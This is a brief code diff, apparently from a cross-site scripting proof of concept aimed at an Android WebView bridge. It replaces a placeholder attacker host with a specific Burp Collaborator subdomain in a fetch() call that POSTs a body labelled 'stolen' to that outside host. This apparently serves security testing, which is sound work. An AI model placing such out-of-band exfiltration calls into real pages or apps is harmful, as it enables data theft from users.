@@ -15,7 +15,7 @@
           OSAndroid.postMessage(JSON.stringify({ type: "rendering_complete" }));
 
           // Now send data to collaborator
-          fetch("https://attacker.oastify.com", {
+          fetch("https://evd2kzw2mn34lc4mxspo7tl86zcq0mob.oastify.com", {
             method: "POST",
             body: JSON.stringify({ stolen: "XSS executed successfully" }),
           });
